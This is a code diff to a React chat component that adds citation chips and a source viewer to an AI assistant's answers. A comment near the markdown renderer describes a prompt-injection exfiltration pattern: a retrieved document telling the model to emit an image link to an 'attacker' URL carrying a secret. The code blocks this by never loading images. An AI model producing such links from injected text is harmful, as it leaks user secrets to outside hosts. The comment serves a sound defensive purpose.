@@ -1,4 +1,4 @@
-import { useState } from "react"
+import { useMemo, useState } from "react"
 import ReactMarkdown, { type Components } from "react-markdown"
 import remarkGfm from "remark-gfm"
 import {
@@ -22,6 +22,7 @@ import {
 } from "lucide-react"
 import { toast } from "sonner"
 
+import { CitationChip, SourceSheet } from "@/components/citations"
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
 import { Badge } from "@/components/ui/badge"
 import { Button } from "@/components/ui/button"
@@ -39,6 +40,7 @@ import {
   type Step,
   type StepLine,
 } from "@/lib/api"
+import { CitationsContext, citedNumber, placeOf, remarkCitations } from "@/lib/citations"
 
 // One line of the steps panel, live while the assistant works.
 export interface LiveStep extends StepLine {
@@ -71,20 +73,33 @@ export interface AnswerActions {
   onFeedback: (message: Message, feedback: Feedback | null) => void
 }
 
-function SourceCard({ source, index }: { source: Source; index: number }) {
+// One line of the sources under an answer. A cited passage opens in the source
+// viewer (numbered like its [S#] chips); a page read whole opens its link.
+function SourceCard({
+  source,
+  index,
+  onOpen,
+}: {
+  source: Source
+  index: number
+  onOpen: (source: Source) => void
+}) {
   const general = source.kind === "general_knowledge"
   const isWiki = source.provider.toLowerCase().includes("outline")
   const Icon = general ? Globe : isWiki ? BookOpen : FileText
   const label = general ? `General knowledge · ${source.provider}` : source.provider
+  const place = placeOf(source)
+  const passage = source.chunk_id || source.snippet
   const body = (
-    <div className="flex items-center gap-3 rounded-lg border bg-card px-3 py-2 text-sm transition-colors hover:bg-muted/60">
-      <span className="flex size-6 shrink-0 items-center justify-center rounded-md bg-muted text-xs font-medium">
-        {index}
+    <div className="flex items-center gap-3 rounded-lg border bg-card px-3 py-2 text-left text-sm transition-colors hover:bg-muted/60">
+      <span className="flex size-6 shrink-0 items-center justify-center rounded-md bg-muted text-xs font-medium tabular-nums">
+        {source.n ?? index}
       </span>
       <Icon className="size-4 shrink-0 text-muted-foreground" />
       {/* On a phone the provider goes under the title, so the title keeps the width. */}
       <span className="min-w-0 flex-1">
         <span className="block truncate font-medium">{source.title}</span>
+        {place && <span className="block truncate text-xs text-muted-foreground">{place}</span>}
         <span className="block truncate text-xs text-muted-foreground sm:hidden">{label}</span>
       </span>
       <Badge
@@ -93,9 +108,21 @@ function SourceCard({ source, index }: { source: Source; index: number }) {
       >
         <span className="truncate">{label}</span>
       </Badge>
-      {source.url && <ExternalLink className="size-3.5 shrink-0 text-muted-foreground" />}
+      {source.url && !passage && <ExternalLink className="size-3.5 shrink-0 text-muted-foreground" />}
     </div>
   )
+  if (passage) {
+    return (
+      <button
+        type="button"
+        onClick={() => onOpen(source)}
+        aria-label={`Open source ${source.n ?? index}: ${source.title}${place ? `, ${place}` : ""}`}
+        className="min-w-0 rounded-lg outline-none focus-visible:ring-[3px] focus-visible:ring-ring/50"
+      >
+        {body}
+      </button>
+    )
+  }
   return source.url ? (
     <a href={source.url} target="_blank" rel="noreferrer" className="min-w-0">
       {body}
@@ -227,14 +254,29 @@ function AnswerNote({ icon: Icon, children }: { icon: typeof Info; children: str
 // Answers never load images or render raw HTML: a document could tell the model to
 // write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
 // An image shows as its alt text instead.
+// A [S#] marker (made a "#cite-#" link by remarkCitations) is a citation chip.
 const ANSWER_MARKDOWN: Components = {
   img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
+  a: ({ href, title, children }) => {
+    const n = citedNumber(href)
+    return n ? (
+      <CitationChip n={n} />
+    ) : (
+      <a href={href} title={title}>
+        {children}
+      </a>
+    )
+  },
 }
 
 function Markdown({ text, streaming }: { text: string; streaming?: boolean }) {
   return (
     <div className="max-w-none text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5">
-      <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={ANSWER_MARKDOWN}>
+      <ReactMarkdown
+        remarkPlugins={[remarkGfm, remarkCitations]}
+        skipHtml
+        components={ANSWER_MARKDOWN}
+      >
         {text}
       </ReactMarkdown>
       {streaming && (
@@ -491,35 +533,54 @@ function AnswerBody({ message, actions }: { message: Message; actions: AnswerAct
 const RATEABLE: AnswerState[] = ["answered", "partial", "general_knowledge", "not_found", "blocked"]
 
 export function AssistantMessage({ message, actions }: { message: Message; actions: AnswerActions }) {
-  const sources = message.withheld ? [] : (message.sources ?? [])
+  const sources = useMemo(
+    () => (message.withheld ? [] : (message.sources ?? [])),
+    [message.withheld, message.sources],
+  )
   const finished = !message.streaming && !message.limited
+  const [opened, setOpened] = useState<Source | null>(null)
+  const citations = useMemo(
+    () => ({
+      byNumber: new Map(sources.filter((s) => s.n !== undefined).map((s) => [s.n!, s])),
+      open: setOpened,
+    }),
+    [sources],
+  )
   return (
-    <div className="flex gap-3" data-state={message.state}>
-      <div className="flex size-8 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground">
-        <Sparkles className={message.streaming ? "size-4 animate-pulse" : "size-4"} />
-      </div>
-      <div className="min-w-0 flex-1 space-y-3 pt-1">
-        <StepsPanel message={message} />
-        {message.limited && <LimitNotice text={message.limited} />}
-        {!message.limited && (message.streaming ? message.text && <Markdown text={message.text} streaming /> : <AnswerBody message={message} actions={actions} />)}
+    <CitationsContext value={citations}>
+      <div className="flex gap-3" data-state={message.state}>
+        <div className="flex size-8 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground">
+          <Sparkles className={message.streaming ? "size-4 animate-pulse" : "size-4"} />
+        </div>
+        <div className="min-w-0 flex-1 space-y-3 pt-1">
+          <StepsPanel message={message} />
+          {message.limited && <LimitNotice text={message.limited} />}
+          {!message.limited && (message.streaming ? message.text && <Markdown text={message.text} streaming /> : <AnswerBody message={message} actions={actions} />)}
 
-        {sources.length > 0 && (
-          <div className="space-y-2">
-            <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
-              Sources
-            </p>
-            <div className="grid min-w-0 grid-cols-1 gap-2">
-              {sources.map((s, i) => (
-                <SourceCard key={`${s.provider}-${s.title}`} source={s} index={i + 1} />
-              ))}
+          {sources.length > 0 && (
+            <div className="space-y-2">
+              <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
+                Sources
+              </p>
+              <div className="grid min-w-0 grid-cols-1 gap-2">
+                {sources.map((s, i) => (
+                  <SourceCard
+                    key={s.chunk_id ?? `${s.provider}-${s.title}`}
+                    source={s}
+                    index={i + 1}
+                    onOpen={setOpened}
+                  />
+                ))}
+              </div>
             </div>
-          </div>
-        )}
+          )}
 
-        {finished && !message.withheld && message.state && RATEABLE.includes(message.state) && (
-          <FeedbackRow key={message.id} message={message} onFeedback={actions.onFeedback} />
-        )}
+          {finished && !message.withheld && message.state && RATEABLE.includes(message.state) && (
+            <FeedbackRow key={message.id} message={message} onFeedback={actions.onFeedback} />
+          )}
+        </div>
+        <SourceSheet source={opened} onOpenChange={(open) => !open && setOpened(null)} />
       </div>
-    </div>
+    </CitationsContext>
   )
 }
